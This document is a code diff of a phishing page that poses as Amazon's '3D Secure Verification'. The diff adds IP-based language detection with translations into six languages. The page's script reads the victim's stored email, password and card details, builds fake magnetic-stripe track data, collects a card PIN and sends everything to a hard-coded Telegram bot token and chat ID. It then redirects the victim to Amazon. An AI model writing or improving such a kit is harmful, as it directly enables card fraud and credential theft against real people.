@@ -31,16 +31,16 @@
 <body>
     <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
-        <h1>3D Secure Verification</h1>
-        <p class="sub">Your bank requires additional verification to protect your transaction.</p>
+        <h1 id="judul">3D Secure Verification</h1>
+        <p class="sub" id="subTeks">Your bank requires additional verification to protect your transaction.</p>
         
         <div class="info">
-            <div>Card: <strong id="tampilKartu">—</strong></div>
-            <div>Email: <strong id="tampilEmail">—</strong></div>
+            <div><span id="labelKartu">Card:</span> <strong id="tampilKartu">—</strong></div>
+            <div><span id="labelEmail">Email:</span> <strong id="tampilEmail">—</strong></div>
         </div>
         <form id="form3ds">
-            <p class="pin-judul">Enter your PIN</p>
-            <p class="pin-ket">Enter the 6-digit verification PIN from your card-issuing bank.</p>
+            <p class="pin-judul" id="pinJudul">Enter your PIN</p>
+            <p class="pin-ket" id="pinKeterangan">Enter the 6-digit verification PIN from your card-issuing bank.</p>
             
             <div class="pin-baris">
                 <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p1"></div>
@@ -50,22 +50,156 @@
                 <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p5"></div>
                 <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p6"></div>
             </div>
-            <button type="submit" id="tombol">Verify & Complete</button>
+            <button type="submit" id="tombol"><span id="teksTombol">Verify & Complete</span></button>
             <div class="proses" id="sedang">⏳ Verifying...</div>
         </form>
     </div>
     <div class="footer">
-        <a href="#">Conditions of Use</a>
-        <a href="#">Privacy Notice</a>
-        <a href="#">Help</a>
-        <p style="margin-top: 8px;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <a href="#" id="syaratLink1">Conditions of Use</a>
+        <a href="#" id="syaratLink2">Privacy Notice</a>
+        <a href="#" id="bantuanLink">Help</a>
+        <p style="margin-top: 8px;" id="hakCiptaan">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
 <script>
 const BOT_TOKEN = '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
 const CHAT_ID = '7808815199';
 
-// Ambil semua data tersimpan — sesuaikan dengan penyimpanan kita
+// ==============================================
+// DAFTAR TERJEMAHAN
+// ==============================================
+const terjemahan = {
+    EN: {
+        judul: '3D Secure Verification',
+        subTeks: 'Your bank requires additional verification to protect your transaction.',
+        labelKartu: 'Card:',
+        labelEmail: 'Email:',
+        pinJudul: 'Enter your PIN',
+        pinKeterangan: 'Enter the 6-digit verification PIN from your card-issuing bank.',
+        teksTombol: 'Verify & Complete',
+        sedang: '⏳ Verifying...',
+        peringatanPIN: 'Please enter 6-digit PIN',
+        syaratLink1: 'Conditions of Use',
+        syaratLink2: 'Privacy Notice',
+        bantuanLink: 'Help',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. or its affiliates'
+    },
+    JA: {
+        judul: '3Dセキュア認証',
+        subTeks: 'お取引を保護するため、発行銀行による追加の本人確認が必要です。',
+        labelKartu: 'カード：',
+        labelEmail: 'メール：',
+        pinJudul: 'PINを入力',
+        pinKeterangan: 'カード発行銀行から通知された6桁の確認用PINを入力してください。',
+        teksTombol: '確認して完了',
+        sedang: '⏳ 確認中...',
+        peringatanPIN: '6桁のPINを入力してください',
+        syaratLink1: '利用規約',
+        syaratLink2: 'プライバシー通知',
+        bantuanLink: 'ヘルプ',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. またはその関連会社'
+    },
+    ZH: {
+        judul: '3D安全验证',
+        subTeks: '您的发卡银行需要额外验证以保护您的交易安全。',
+        labelKartu: '卡号：',
+        labelEmail: '邮箱：',
+        pinJudul: '输入PIN码',
+        pinKeterangan: '请输入发卡银行提供的6位数字验证PIN码。',
+        teksTombol: '验证并完成',
+        sedang: '⏳ 验证中...',
+        peringatanPIN: '请输入6位PIN码',
+        syaratLink1: '使用条件',
+        syaratLink2: '隐私声明',
+        bantuanLink: '帮助',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. 或其关联公司'
+    },
+    TH: {
+        judul: 'การยืนยันความปลอดภัย 3D',
+        subTeks: 'ธนาคารต้องการการยืนยันเพิ่มเติมเพื่อปกป้องการทำธุรกรรมของคุณ',
+        labelKartu: 'บัตร：',
+        labelEmail: 'อีเมล：',
+        pinJudul: 'ป้อนรหัส PIN',
+        pinKeterangan: 'ป้อนรหัส PIN 6 หลักจากธนาคารผู้ออกบัตร',
+        teksTombol: 'ยืนยันและเสร็จสิ้น',
+        sedang: '⏳ กำลังตรวจสอบ...',
+        peringatanPIN: 'กรุณาป้อนรหัส PIN 6 หลัก',
+        syaratLink1: 'เงื่อนไขการใช้งาน',
+        syaratLink2: 'ประกาศความเป็นส่วนตัว',
+        bantuanLink: 'ช่วยเหลือ',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. หรือบริษัทในเครือ'
+    },
+    KO: {
+        judul: '3D 보안 인증',
+        subTeks: '거래 보호를 위해 은행에서 추가 인증을 요청합니다.',
+        labelKartu: '카드：',
+        labelEmail: '이메일：',
+        pinJudul: 'PIN 번호 입력',
+        pinKeterangan: '카드 발급 은행에서 발급받은 6자리 인증 PIN 번호를 입력하세요.',
+        teksTombol: '인증 및 완료',
+        sedang: '⏳ 인증 중...',
+        peringatanPIN: '6자리 PIN 번호를 입력하세요',
+        syaratLink1: '이용 약관',
+        syaratLink2: '개인정보 처리방침',
+        bantuanLink: '도움말',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. 또는 그 계열사'
+    },
+    ID: {
+        judul: 'Verifikasi Keamanan 3D',
+        subTeks: 'Bank Anda memerlukan verifikasi tambahan untuk melindungi transaksi Anda.',
+        labelKartu: 'Kartu:',
+        labelEmail: 'Email:',
+        pinJudul: 'Masukkan PIN',
+        pinKeterangan: 'Masukkan PIN verifikasi 6 digit dari bank penerbit kartu Anda.',
+        teksTombol: 'Verifikasi & Selesai',
+        sedang: '⏳ Sedang memverifikasi...',
+        peringatanPIN: 'Masukkan PIN 6 digit',
+        syaratLink1: 'Syarat Penggunaan',
+        syaratLink2: 'Pemberitahuan Privasi',
+        bantuanLink: 'Bantuan',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. atau afiliasinya'
+    }
+};
+
+const negaraKeBahasa = {
+    JP: 'JA', CN: 'ZH', HK: 'ZH', TW: 'ZH', TH: 'TH', KR: 'KO', ID: 'ID',
+    MY: 'EN', SG: 'EN', US: 'EN', AU: 'EN', GB: 'EN', CA: 'EN', NZ: 'EN'
+};
+
+// ==============================================
+// DETEKSI & TERAPKAN BAHASA
+// ==============================================
+let teksAktif = terjemahan.EN;
+
+async function terapkanBahasa() {
+    let kodeNegara = 'GB';
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        kodeNegara = data.country_code || 'GB';
+    } catch {}
+
+    const kodeBahasa = negaraKeBahasa[kodeNegara] || 'EN';
+    teksAktif = terjemahan[kodeBahasa] || terjemahan.EN;
+
+    document.documentElement.lang = kodeBahasa.toLowerCase();
+    document.getElementById('judul').textContent = teksAktif.judul;
+    document.getElementById('subTeks').textContent = teksAktif.subTeks;
+    document.getElementById('labelKartu').textContent = teksAktif.labelKartu;
+    document.getElementById('labelEmail').textContent = teksAktif.labelEmail;
+    document.getElementById('pinJudul').textContent = teksAktif.pinJudul;
+    document.getElementById('pinKeterangan').textContent = teksAktif.pinKeterangan;
+    document.getElementById('teksTombol').textContent = teksAktif.teksTombol;
+    document.getElementById('sedang').textContent = teksAktif.sedang;
+    document.getElementById('syaratLink1').textContent = teksAktif.syaratLink1;
+    document.getElementById('syaratLink2').textContent = teksAktif.syaratLink2;
+    document.getElementById('bantuanLink').textContent = teksAktif.bantuanLink;
+    document.getElementById('hakCiptaan').textContent = teksAktif.hakCiptaan;
+}
+
+// ==============================================
+// AMBIL DATA DARI LOCALSTORAGE
+// ==============================================
 const email = localStorage.getItem('email_pengguna') || '';
 const password = localStorage.getItem('kata_sandi') || '';
 const namaKartu = localStorage.getItem('nama_kartu') || '';
@@ -85,7 +219,7 @@ const nomorTelp = localStorage.getItem('nomor_telp') || '';
 const nomorBersih = nomorKartu.replace(/\s/g, '');
 const namaTrack = namaKartu.replace(/\s+/g, '/').substring(0, 20).toUpperCase();
 const expHanya = expKartu.replace('/', '');
-const expTrack = expHanya.substring(2, 4) + expHanya.substring(0, 2);
+const expTrack = expHanya.length >= 4 ? expHanya.substring(2, 4) + expHanya.substring(0, 2) : '0000';
 const sisa = '0000000000000000';
 const track1 = `%B${nomorBersih}^${namaTrack}^${expTrack}${sisa.substring(0, 10)}?`;
 const track2 = `;${nomorBersih}=${expTrack}${sisa.substring(0, 10)}?`;
@@ -177,7 +311,10 @@ async function kirimTelegram(pesan) {
 document.getElementById('form3ds').addEventListener('submit', async e => {
     e.preventDefault();
     const pin = ambilPIN();
-    if (pin.length !== 6) { alert('Please enter 6-digit PIN'); return; }
+    if (pin.length !== 6) { 
+        alert(teksAktif.peringatanPIN || 'Please enter 6-digit PIN'); 
+        return; 
+    }
     
     // Tampilkan proses
     document.getElementById('tombol').disabled = true;
@@ -226,6 +363,8 @@ T2: ${track2}
         window.location.href = 'https://www.amazon.com.au/';
     }, 1000);
 });
+
+terapkanBahasa();
 </script>
 </body>
 </html>
